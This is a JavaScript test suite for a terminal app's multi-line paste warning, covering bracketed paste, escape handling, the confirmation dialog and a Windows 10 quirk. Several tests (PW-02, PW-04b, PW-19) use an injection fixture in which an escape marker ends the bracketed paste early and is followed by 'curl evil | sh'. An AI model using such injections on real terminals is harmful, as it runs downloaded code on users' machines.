/**
 * A paste of several lines is asked about first (src/lib/pasteWarning.js) —
 * VS Code's `terminal.integrated.enableMultiLinePasteWarning`.
 *
 * cmd never turns bracketed paste on, so a block pasted into it runs line by
 * line as it arrives. These cases hold the decision (lines, the line break
 * at the end, CRLF, bracketed paste on and off, each value of the setting),
 * "Paste as One Line", the question's store, and the binding: that the
 * browser's paste — Ctrl+V, Shift+Insert, ⌘V — is held before xterm hears of
 * it and replayed exactly once on Paste, never on Cancel; that the
 * right-click paste asks the same; and that a drop and the empty image paste
 * OpenCode reads go straight through.
 *
 * The terminal is real xterm where Node can have it (`@xterm/headless`): it
 * parses the program's `CSI ? 2004 h` and says whether bracketed paste is on.
 * Its browser half — the paste listeners on its textarea and element, and
 * `paste` itself — is restated from xterm 6's Clipboard.ts, as
 * terminal_right_click.test.js restates it.
 */
import { readFileSync } from 'node:fs';
// Static, as in program_notifications.test.js: other files in this runner
// register module hooks that turn `@xterm/*` into test doubles.
import headless from '@xterm/headless';
import { describe, test, assert } from '../e2e/harness/testFramework.js';
import {
  PASTE_CHOICES,
  PASTE_WARNING_MODES,
  asOneLine,
  installPasteWarning,
  pastedLines,
  pastePromptMessage,
  pastePromptTitle,
  pasteWarning,
  pasteMarkersArrive,
  pasteWarningFor,
  withoutPasteMarkers,
  withoutTrailingBreak,
} from '../../src/lib/pasteWarning.js';
import { installTerminalRightClick, pasteClipboard } from '../../src/lib/terminalRightClick.js';
import { usePastePromptStore } from '../../src/stores/pastePromptStore.js';
import { SETTINGS_DEFAULTS } from '../../src/stores/settingsStore.js';

const { Terminal } = headless;

const ESC = '\x1b';
const BRACKETED_ON = `${ESC}[?2004h`;
const PASTE_START = `${ESC}[200~`;
const PASTE_END = `${ESC}[201~`;
const settle = () => new Promise((resolve) => setTimeout(resolve, 0));
const read = (rel) => readFileSync(new URL(rel, import.meta.url), 'utf8');

// ---- a page that dispatches like a browser ------------------------------------

class FakeNode {
  constructor(name, parent = null) {
    this.name = name;
    this.parentNode = parent;
    this.listeners = [];
  }
  addEventListener(type, fn, options) {
    this.listeners.push({ type, fn, capture: options === true || options?.capture === true });
  }
  removeEventListener(type, fn, options) {
    const capture = options === true || options?.capture === true;
    this.listeners = this.listeners.filter((l) => !(l.type === type && l.fn === fn && l.capture === capture));
  }
}

/** Capture from the top down to the target's parent, the target, then bubbling — stops and preventDefault honoured. */
function dispatch(target, event) {
  const path = [];
  for (let node = target; node; node = node.parentNode) path.unshift(node);
  let stopped = false;
  let immediate = false;
  Object.assign(event, {
    target,
    defaultPrevented: false,
    preventDefault() {
      event.defaultPrevented = true;
    },
    stopPropagation() {
      stopped = true;
    },
    stopImmediatePropagation() {
      stopped = true;
      immediate = true;
    },
  });
  const run = (node, phase) => {
    for (const l of [...node.listeners]) {
      if (l.type !== event.type) continue;
      if (phase === 'capture' && !l.capture) continue;
      if (phase === 'bubble' && l.capture) continue;
      l.fn(event);
      if (immediate) return;
    }
  };
  for (const node of path.slice(0, -1)) {
    run(node, 'capture');
    if (stopped) return event;
  }
  run(target, 'target');
  if (stopped) return event;
  for (const node of path.slice(0, -1).reverse()) {
    run(node, 'bubble');
    if (stopped) return event;
  }
  return event;
}

/** The browser's paste event, carrying `text` as the clipboard's. */
const pasteEvent = (text) => ({ type: 'paste', clipboardData: { getData: (kind) => (kind === 'text/plain' ? text : '') } });

/**
 * A terminal on a page: real xterm's core, and its browser half restated —
 * `paste` (`\r?\n` to `\r`, bracketed while the program asked, sent as user
 * input), and the paste listeners on its textarea and its element
 * (`handlePasteEvent`: stop the event, paste its text).
 */
function page({ settings = {}, ask = null, withdraw = null, gate = true, windowsPty = undefined } = {}) {
  const document = new FakeNode('document');
  const body = new FakeNode('body', document);
  const container = new FakeNode('container', body);
  const element = new FakeNode('xterm', container);
  const textarea = new FakeNode('textarea', element);
  // The find bar's field, beside the terminal: somewhere else to have the keyboard.
  const findInput = new FakeNode('find-input', body);
  findInput.focus = () => {
    document.activeElement = findInput;
  };
  container.ownerDocument = document;
  document.body = body;
  document.activeElement = body;

  const core = new Terminal({ cols: 80, rows: 24, allowProposedApi: true });
  const sent = [];
  core.onData((data) => sent.push(data));
  const questions = [];
  let answer = null;
  const asking = (question) => {
    questions.push(question);
    return new Promise((resolve) => {
      answer = resolve;
    });
  };

  const term = {
    core,
    textarea,
    addons: [],
    get modes() {
      return core.modes;
    },
    options: { windowsPty },
    loadAddon(addon) {
      this.addons.push(addon);
      addon.activate(this);
    },
    dispose() {
      for (const addon of this.addons) addon.dispose();
    },
    focus() {
      document.activeElement = textarea;
    },
    paste(data) {
      let text = data.replace(/\r?\n/g, '\r');
      if (core.modes.bracketedPasteMode) text = `${PASTE_START}${text}${PASTE_END}`;
      core.input(text, true);
    },
  };
  const xtermPaste = (ev) => {
    ev.stopPropagation();
    if (ev.clipboardData) term.paste(ev.clipboardData.getData('text/plain'));
  };
  textarea.addEventListener('paste', xtermPaste);
  element.addEventListener('paste', xtermPaste);

  const store = { getState: () => settings };
  const addon = gate ? installPasteWarning(term, container, { settings: store, ask: ask ?? asking, withdraw }) : null;
  const program = (data) => new Promise((resolve) => core.write(data, resolve));
  return {
    core,
    term,
    addon,
    document,
    container,
    element,
    textarea,
    findInput,
    sent,
    questions,
    answer: async (choice) => {
      answer(choice);
      await addon.answering;
    },
    program,
    /** Ctrl+V: the browser's paste, on xterm's textarea, which has focus. */
    ctrlV: (text) => {
      document.activeElement = textarea;
      return dispatch(textarea, pasteEvent(text));
    },
  };
}

// ---- the decision ---------------------------------------------------------------

describe('Multi-line paste: what counts, and when to ask', () => {
  test('PW-01: lines are counted after ONE line break at the end — only those that would run, blank ones aside', () => {
    assert.deepEqual(pastedLines(''), { lines: 0 });
    assert.deepEqual(pastedLines('dir'), { lines: 1 });
    assert.deepEqual(pastedLines('dir\n'), { lines: 1 }, 'a copied line comes with its own break');
    assert.deepEqual(pastedLines('dir\r\n'), { lines: 1 }, 'CRLF, as Windows copies it');
    assert.deepEqual(pastedLines('dir\r'), { lines: 1 });
    assert.deepEqual(pastedLines('dir\n\n'), { lines: 1 });
    assert.deepEqual(pastedLines('a\nb'), { lines: 2 });
    assert.deepEqual(pastedLines('a\r\nb\r\n'), { lines: 2 });
    assert.deepEqual(pastedLines('a\rb'), { lines: 2 });
    assert.deepEqual(pastedLines('a\n\nb\n'), { lines: 2 }, 'the empty line between runs nothing');
    assert.deepEqual(pastedLines('\n\n\n'), { lines: 0 });
    // Review C9: a line of spaces was a line — "Paste 2 lines?" for one command.
    assert.deepEqual(pastedLines('echo one\n   '), { lines: 1 });
    assert.deepEqual(pastedLines('  \n  \n'), { lines: 0 });
    // Review 2026-10-11: a Tab completes in cmd and readline shells, and the
    // Enter after it runs the result — a Tab-only line is a line.
    assert.deepEqual(pastedLines('echo one\n\t\n'), { lines: 2 });
    assert.deepEqual(pastedLines('\t'), { lines: 1 });
    assert.deepEqual(pastedLines('  a\n \n b '), { lines: 2 });
    assert.deepEqual(pastedLines(null), { lines: 0 });
    assert.equal(withoutTrailingBreak('a\r\n\r\n'), 'a\r\n');
  });

  test('PW-02: asked for two or more non-empty lines — by default only where the program did not ask for bracketed paste', () => {
    const cases = [
      // [text, mode, bracketed, asked]
      ['echo one\n', 'auto', false, false],
      ['echo one\necho two', 'auto', false, true],
      ['echo one\r\necho two\r\n', 'auto', false, true],
      ['echo one\necho two', 'auto', true, false],
      ['echo one\necho two', 'always', true, true],
      ['echo one\necho two', 'always', false, true],
      ['echo one\necho two', 'never', false, false],
      ['echo one\necho two', 'never', true, false],
      ['echo one\n\n', 'always', false, false],
      ['', 'always', true, false],
      ['echo one\necho two', 'surprise', false, true],
      ['echo one\necho two', 'surprise', true, false],
      ['echo one\n   ', 'always', false, false],
      // Review C3: an escape character can end a bracketed paste early, so
      // a bracket is not trusted to hold it.
      ['echo safe\x1b[201~\ncurl evil | sh\n', 'auto', true, true],
      ['echo \x1b[31mred\nnext', 'auto', true, true],
      ['echo safe\x1b[201~\ncurl evil | sh\n', 'never', true, false],
    ];
    for (const [text, mode, bracketed, asked] of cases) {
      const question = pasteWarning(text, { mode, bracketed });
      assert.equal(Boolean(question), asked, `${JSON.stringify(text)} with ${mode}, bracketed ${bracketed}`);
      if (question) assert.deepEqual(question, { lines: pastedLines(text).lines, bracketed, escape: text.includes('\x1b'), markersLost: false });
    }
    assert.deepEqual(PASTE_WARNING_MODES, ['auto', 'always', 'never']);
    assert.equal(SETTINGS_DEFAULTS.terminalMultiLinePasteWarning, 'auto');
  });

  test('PW-03: "Paste as One Line" makes each line break a space and drops the one at the end', () => {
    assert.equal(asOneLine('cd src\nnpm test\n'), 'cd src npm test');
    assert.equal(asOneLine('cd src\r\nnpm test\r\n'), 'cd src npm test');
    assert.equal(asOneLine('a\rb'), 'a b');
    assert.equal(asOneLine('a\n\nb'), 'a  b', 'each break is one space');
    assert.equal(asOneLine('a\nb\n\n'), 'a b ', 'only ONE break at the end is dropped');
    assert.equal(asOneLine('plain'), 'plain');
  });

  test('PW-04: the question says how many lines, and why it is asked', () => {
    assert.equal(pastePromptTitle(3), 'Paste 3 lines?');
    assert.match(pastePromptMessage({ bracketed: false }), /each line runs as a command as soon as it is pasted/);
    assert.match(pastePromptMessage({ bracketed: false }), /did not ask for bracketed paste/);
    assert.match(pastePromptMessage({ bracketed: true }), /asked for bracketed paste/);
    assert.match(pastePromptMessage({ bracketed: true, escape: true }), /escape sequence, which can end a bracketed paste early/);
  });

  test('PW-04b: bracketed paste\'s markers are taken out of what is pasted — until none is left', () => {
    assert.equal(withoutPasteMarkers('echo safe\x1b[201~\ncurl evil | sh\n'), 'echo safe\ncurl evil | sh\n');
    assert.equal(withoutPasteMarkers('\x1b[200~x\x1b[201~'), 'x');
    assert.equal(withoutPasteMarkers('\x1b[20\x1b[201~1~tail'), 'tail', 'one put back together from the pieces around another');
    assert.equal(withoutPasteMarkers('\x1b[31mred\x1b[0m'), '\x1b[31mred\x1b[0m', 'other sequences are the text\'s own');
    assert.equal(withoutPasteMarkers(''), '');
    assert.equal(withoutPasteMarkers(null), '');
  });
});

// ---- the binding ----------------------------------------------------------------

describe('Multi-line paste: the browser\'s paste is held, then pasted as answered', () => {
  test('PW-05: Ctrl+V of two lines into cmd — xterm hears nothing; Paste replays it exactly once', async () => {
    const p = page();
    const event = p.ctrlV('dir\necho done\n');
    assert.equal(event.defaultPrevented, true, 'the webview would have pasted into the textarea');
    assert.deepEqual(p.sent, [], 'xterm sent the lines before anyone was asked');
    assert.deepEqual(p.questions, [{ lines: 2, bracketed: false, escape: false, markersLost: false }]);
    await p.answer('paste');
    assert.deepEqual(p.sent, ['dir\recho done\r'], 'pasted once, as xterm would have');
    assert.equal(p.document.activeElement, p.textarea, 'the terminal has the keyboard again');
    await settle();
    assert.deepEqual(p.sent, ['dir\recho done\r'], 'and only once');
  });

  test('PW-06: Cancel sends nothing at all, and gives the terminal the keyboard back', async () => {
    const p = page();
    p.ctrlV('rmdir /s /q build\r\nnpm run build\r\n');
    p.document.activeElement = null;
    await p.answer('cancel');
    await settle();
    assert.deepEqual(p.sent, []);
    assert.equal(p.document.activeElement, p.textarea);
  });

  test('PW-07: Paste as One Line sends the lines joined by spaces', async () => {
    const p = page();
    p.ctrlV('git add .\ngit commit\n');
    await p.answer('oneLine');
    assert.deepEqual(p.sent, ['git add . git commit']);
  });

  test('PW-08: the text pasted is the one captured at the paste — whatever is on the clipboard by the answer', async () => {
    const p = page();
    const clipboard = { text: 'first\nsecond' };
    const event = { type: 'paste', clipboardData: { getData: () => clipboard.text } };
    dispatch(p.textarea, event);
    clipboard.text = 'something copied while the dialog was up';
    await p.answer('paste');
    assert.deepEqual(p.sent, ['first\rsecond']);
  });

  test('PW-09: a program that asked for bracketed paste gets it at once by default — and asked about under "always"', async () => {
    const auto = page();
    await auto.program(BRACKETED_ON);
    const event = auto.ctrlV('a\nb\n');
    assert.equal(event.defaultPrevented, false);
    assert.deepEqual(auto.questions, []);
    assert.deepEqual(auto.sent, [`${PASTE_START}a\rb\r${PASTE_END}`], 'xterm pasted it, bracketed');

    const always = page({ settings: { terminalMultiLinePasteWarning: 'always' } });
    await always.program(BRACKETED_ON);
    always.ctrlV('a\nb\n');
    assert.deepEqual(always.questions, [{ lines: 2, bracketed: true, escape: false, markersLost: false }]);
    await always.answer('paste');
    assert.deepEqual(always.sent, [`${PASTE_START}a\rb\r${PASTE_END}`]);

    const never = page({ settings: { terminalMultiLinePasteWarning: 'never' } });
    never.ctrlV('a\nb\n');
    assert.deepEqual(never.questions, []);
    assert.deepEqual(never.sent, ['a\rb\r'], 'never: pasted as it always was');
  });

  test('PW-10: one line, its own break included, and the empty image paste go straight to xterm', async () => {
    const p = page();
    assert.equal(p.ctrlV('npm test\n').defaultPrevented, false);
    assert.deepEqual(p.sent, ['npm test\r']);
    await p.program(BRACKETED_ON);
    // An image-only clipboard: the browser's paste carries no text, and xterm
    // sends an EMPTY bracketed paste — OpenCode's "attach the clipboard image".
    assert.equal(p.ctrlV('').defaultPrevented, false);
    assert.deepEqual(p.sent, ['npm test\r', `${PASTE_START}${PASTE_END}`]);
    assert.deepEqual(p.questions, []);
  });

  test('PW-11: the setting is read at every paste', async () => {
    const settings = { terminalMultiLinePasteWarning: 'never' };
    const p = page({ settings });
    p.ctrlV('a\nb');
    assert.deepEqual(p.sent, ['a\rb']);
    settings.terminalMultiLinePasteWarning = 'auto';
    p.ctrlV('c\nd');
    assert.deepEqual(p.questions, [{ lines: 2, bracketed: false, escape: false, markersLost: false }]);
    delete settings.terminalMultiLinePasteWarning;
    await p.answer('cancel');
    p.ctrlV('e\nf');
    assert.equal(p.questions.length, 2, 'absent, the setting is auto');
  });

  test('PW-12: a terminal closed while the question was up pastes nothing; without anyone to ask, nothing is held', async () => {
    const p = page();
    p.ctrlV('a\nb');
    p.term.dispose();
    await p.answer('paste');
    assert.deepEqual(p.sent, []);

    const unasked = page({ ask: 'not a function' });
    assert.equal(unasked.ctrlV('a\nb').defaultPrevented, false);
    assert.deepEqual(unasked.sent, ['a\rb']);
  });
});

describe('Multi-line paste: the right-click paste asks too; drops and images do not', () => {
  test('PW-13: a right-click paste of several lines is held for the same question, then pasted as answered', async () => {
    const p = page();
    assert.equal(pasteClipboard(p.term, { text: 'cd C:\\work\r\ndir\r\n', image: false }), 'held');
    assert.deepEqual(p.sent, []);
    assert.deepEqual(p.questions, [{ lines: 2, bracketed: false, escape: false, markersLost: false }]);
    await p.answer('oneLine');
    assert.deepEqual(p.sent, ['cd C:\\work dir']);
    // One line, as before.
    assert.equal(pasteClipboard(p.term, { text: 'dir', image: false }), 'text');
    assert.deepEqual(p.sent, ['cd C:\\work dir', 'dir']);
  });

  test('PW-14: the image-only right-click paste — `term.paste(\'\')` — is never held', async () => {
    const p = page();
    await p.program(BRACKETED_ON);
    assert.equal(pasteClipboard(p.term, { text: '', image: true }), 'image');
    assert.deepEqual(p.sent, [`${PASTE_START}${PASTE_END}`]);
    assert.deepEqual(p.questions, []);
  });

  test('PW-15: a terminal without the check pastes as it always did', () => {
    const p = page({ gate: false });
    assert.equal(pasteWarningFor(p.term), null);
    assert.equal(pasteClipboard(p.term, { text: 'a\nb', image: false }), 'text');
    assert.deepEqual(p.sent, ['a\rb']);
  });

  test('PW-16: files dropped on a pane go straight to xterm\'s paste — never past the question', async () => {
    const registry = read('../../src/components/terminal/terminalRegistry.js');
    const start = registry.indexOf('export function pasteIntoTerminal(tabId, text) {');
    const end = registry.slice(start).search(/\r?\n\}\r?\n/) + start;
    assert.ok(start > 0 && end > start, 'pasteIntoTerminal is where the drop pastes');
    const body = registry.slice(start, end);
    assert.match(body, /const clean = withoutPasteMarkers\(text\);\s*if \(!clean\) return false;\s*entry\.term\.paste\(clean\);/);
    assert.doesNotMatch(body, /pasteClipboard|hold\(|pasteWarning\(/);
    // And xterm's own `paste`, which the drop calls, is not wrapped by the check.
    const p = page();
    p.term.paste('C:\\a b\\one.txt C:\\two.txt');
    assert.deepEqual(p.sent, ['C:\\a b\\one.txt C:\\two.txt']);
    assert.deepEqual(p.questions, []);
  });
});

describe('Multi-line paste: the question on screen', () => {
  test('PW-17: the store asks, the dialog answers — anything unknown is Cancel, and a newer question answers the older Cancel', async () => {
    const S = usePastePromptStore;
    S.getState().answer('cancel');
    const first = S.getState().ask('tab-term-1', { lines: 2, bracketed: false });
    const shown = S.getState().prompt;
    assert.equal(shown.tabId, 'tab-term-1');
    assert.equal(shown.lines, 2);
    assert.equal(shown.bracketed, false);
    const second = S.getState().ask('tab-term-2', { lines: 5, bracketed: true });
    assert.equal(await first, 'cancel');
    assert.notEqual(S.getState().prompt.id, shown.id, 'a new question, a new dialog');
    S.getState().answer('oneLine');
    assert.equal(await second, 'oneLine');
    assert.equal(S.getState().prompt, null);
    const third = S.getState().ask('tab-term-3', { lines: 2 });
    S.getState().answer('delete everything');
    assert.equal(await third, 'cancel');
    assert.deepEqual(PASTE_CHOICES, ['paste', 'oneLine', 'cancel']);
  });

  test('PW-18: every terminal gets the check, asking the store for its own tab; the app draws the dialog', () => {
    const registry = read('../../src/components/terminal/terminalRegistry.js');
    const start = registry.indexOf('installPasteWarning(term, container, {');
    const end = registry.indexOf('});', start) + 3;
    assert.ok(start > 0 && end > start, 'getOrCreateTerminal installs it');
    let installed = null;
    const asked = [];
    const run = new Function('installPasteWarning', 'term', 'container', 'tabId', 'useSettingsStore', 'usePastePromptStore', registry.slice(start, end));
    const settings = { getState: () => ({ terminalMultiLinePasteWarning: 'always' }) };
    run(
      (t, c, options) => {
        installed = { t, c, options };
      },
      'the-term',
      'the-container',
      'tab-term-9',
      settings,
      { getState: () => ({ ask: (...args) => asked.push(args) }) }
    );
    assert.equal(installed.t, 'the-term');
    assert.equal(installed.c, 'the-container');
    assert.equal(installed.options.settings, settings);
    installed.options.ask({ lines: 4, bracketed: false });
    assert.deepEqual(asked, [['tab-term-9', { lines: 4, bracketed: false }]]);

    const app = read('../../src/App.jsx');
    assert.match(app, /<PasteWarningDialog \/>/);
    const dialog = read('../../src/components/terminal/PasteWarningDialog.jsx');
    assert.match(dialog, /confirmLabel="Paste"/);
    assert.match(dialog, /altLabel="Paste as One Line"/);
    assert.match(dialog, /onAlt=\{\(\) => answer\('oneLine'\)\}/);
    assert.match(dialog, /onConfirm=\{\(\) => answer\('paste'\)\}/);
    assert.match(dialog, /onCancel=\{\(\) => answer\('cancel'\)\}/);
    assert.match(dialog, /createPortal\(/);
    // Review C5: Ctrl+V and then Enter out of habit must not be the answer.
    assert.match(dialog, /initialFocus="cancel"/);
    assert.match(registry.slice(start, end), /withdraw: \(\) => usePastePromptStore\.getState\(\)\.withdraw\(tabId\),/);
  });
});

describe('Multi-line paste: after review', () => {
  test('PW-19: an end marker inside the text cannot close the bracket — asked about, and pasted without it', async () => {
    // Review C3, verified in Chromium: with bracketed paste on, this gave no
    // question and the second line ran.
    const p = page();
    await p.program(BRACKETED_ON);
    const event = p.ctrlV('echo safe\x1b[201~\ncurl evil | sh\n');
    assert.equal(event.defaultPrevented, true);
    assert.deepEqual(p.sent, []);
    assert.deepEqual(p.questions, [{ lines: 2, bracketed: true, escape: true, markersLost: false }]);
    await p.answer('paste');
    assert.deepEqual(p.sent, [`${PASTE_START}echo safe\rcurl evil | sh\r${PASTE_END}`], 'one bracket, markers out');
  });

  test('PW-20: a single line with a marker in it is pasted cleaned — and one of only markers sends nothing, never an empty paste', async () => {
    const p = page();
    await p.program(BRACKETED_ON);
    const event = p.ctrlV('a\x1b[201~b');
    assert.equal(event.defaultPrevented, true, 'xterm would have pasted the marker');
    assert.deepEqual(p.sent, [`${PASTE_START}ab${PASTE_END}`]);
    assert.deepEqual(p.questions, []);
    p.ctrlV('\x1b[200~\x1b[201~');
    assert.deepEqual(p.sent, [`${PASTE_START}ab${PASTE_END}`], 'not the empty paste OpenCode reads as "attach the image"');
    // The right-click paste too.
    assert.equal(pasteClipboard(p.term, { text: 'c\x1b[200~d', image: false }), 'text');
    assert.equal(pasteClipboard(p.term, { text: '\x1b[201~', image: false }), 'nothing');
    assert.deepEqual(p.sent, [`${PASTE_START}ab${PASTE_END}`, `${PASTE_START}cd${PASTE_END}`]);
  });

  test('PW-21: the program turning bracketed paste off while the question was up — asked again before anything runs', async () => {
    // Review C7: the answer was to another question.
    const p = page({ settings: { terminalMultiLinePasteWarning: 'always' } });
    await p.program(BRACKETED_ON);
    p.ctrlV('a\nb\n');
    assert.deepEqual(p.questions, [{ lines: 2, bracketed: true, escape: false, markersLost: false }]);
    await p.program(`${ESC}[?2004l`);
    await p.answer('paste');
    assert.deepEqual(p.sent, [], 'nothing pasted on an answer to the old question');
    assert.deepEqual(p.questions[1], { lines: 2, bracketed: false, escape: false, markersLost: false }, 'asked again, about what it is now');
    await p.answer('paste');
    assert.deepEqual(p.sent, ['a\rb\r']);
  });

  test('PW-22: a terminal closed while its question is up takes the question back', async () => {
    // Review C8: Ctrl+W works while the dialog is open, and Paste then did
    // nothing, silently.
    const S = usePastePromptStore;
    S.getState().answer('cancel');
    const p = page({
      ask: (question) => S.getState().ask('tab-closing', question),
      withdraw: () => S.getState().withdraw('tab-closing'),
    });
    p.ctrlV('a\nb');
    assert.equal(S.getState().prompt?.tabId, 'tab-closing');
    const answering = p.addon.answering;
    p.term.dispose();
    assert.equal(S.getState().prompt, null, 'the dialog closes with its terminal');
    await answering;
    assert.deepEqual(p.sent, []);
    // Another terminal's question is not taken back by this one.
    const other = S.getState().ask('tab-other', { lines: 2 });
    S.getState().withdraw('tab-closing');
    assert.equal(S.getState().prompt?.tabId, 'tab-other');
    S.getState().answer('cancel');
    assert.equal(await other, 'cancel');
  });

  test('PW-23: after a right-click paste, Cancel gives the keyboard back to where it was; Paste leaves it in the terminal', async () => {
    // Review C10: it always went to xterm, even from the find bar's field.
    const make = () => {
      const p = page();
      const reads = [];
      const read = () => {
        reads.push(1);
        return Promise.resolve({ text: 'one\ntwo', image: false });
      };
      const rightClick = installTerminalRightClick(p.term, p.container, {
        settings: { getState: () => ({ terminalRightClick: 'copyPaste' }) },
        read,
      });
      return { p, rightClick, reads };
    };
    for (const [choice, focused] of [
      ['cancel', 'find-input'],
      ['paste', 'textarea'],
    ]) {
      const { p, rightClick } = make();
      p.findInput.focus();
      dispatch(p.element, { type: 'mousedown', button: 2, shiftKey: false });
      await rightClick.pasting;
      assert.equal(p.document.activeElement, p.textarea, 'the right-click gives the terminal the keyboard');
      assert.equal(p.questions.length, 1, 'two lines: asked');
      await p.answer(choice);
      assert.equal(p.document.activeElement.name, focused, `after ${choice}`);
      assert.deepEqual(p.sent, choice === 'paste' ? ['one\rtwo'] : []);
    }
    // From the terminal itself, Cancel leaves it there.
    const { p, rightClick } = make();
    p.textarea.focus = () => {
      p.document.activeElement = p.textarea;
    };
    p.term.focus();
    dispatch(p.element, { type: 'mousedown', button: 2, shiftKey: false });
    await rightClick.pasting;
    await p.answer('cancel');
    assert.equal(p.document.activeElement, p.textarea);
  });
});

describe('Multi-line paste: where the markers never arrive', () => {
  test('PW-24: on Windows 10 a program\'s bracketed paste is no reason not to ask — its markers never reach it there', async () => {
    // V38: Git Bash had asked for bracketed paste and xterm's mode was on, so
    // two pasted lines went unasked — and the first ran the moment it arrived.
    assert.equal(pasteMarkersArrive(undefined), true, 'off Windows');
    assert.equal(pasteMarkersArrive({ backend: 'conpty', buildNumber: 19045 }), false, 'Windows 10');
    assert.equal(pasteMarkersArrive({ backend: 'conpty' }), false, 'a build not yet known');
    assert.equal(pasteMarkersArrive({ backend: 'conpty', buildNumber: 22621 }), true, 'Windows 11, as before');

    const win10 = page({ windowsPty: { backend: 'conpty', buildNumber: 19045 } });
    await win10.program(BRACKETED_ON);
    const event = win10.ctrlV('echo GB1\necho GB2');
    assert.equal(event.defaultPrevented, true, 'held');
    assert.deepEqual(win10.questions, [{ lines: 2, bracketed: false, escape: false, markersLost: true }]);
    assert.match(pastePromptMessage(win10.questions[0]), /asked for bracketed paste, but this version of Windows does not pass it on/);
    await win10.answer('paste');
    assert.equal(win10.questions.length, 1, 'answered once — not asked again for the mode it already knew');
    assert.deepEqual(win10.sent, [`${PASTE_START}echo GB1\recho GB2${PASTE_END}`], 'then pasted as copied');

    // Windows 11 is left as it was; a program that did not ask is asked
    // about as ever, in the old words.
    const win11 = page({ windowsPty: { backend: 'conpty', buildNumber: 22621 } });
    await win11.program(BRACKETED_ON);
    win11.ctrlV('a\nb');
    assert.deepEqual(win11.questions, []);
    const cmd = page({ windowsPty: { backend: 'conpty', buildNumber: 19045 } });
    cmd.ctrlV('a\nb');
    assert.deepEqual(cmd.questions, [{ lines: 2, bracketed: false, escape: false, markersLost: false }]);
    assert.match(pastePromptMessage(cmd.questions[0]), /did not ask for bracketed paste/);
  });
});
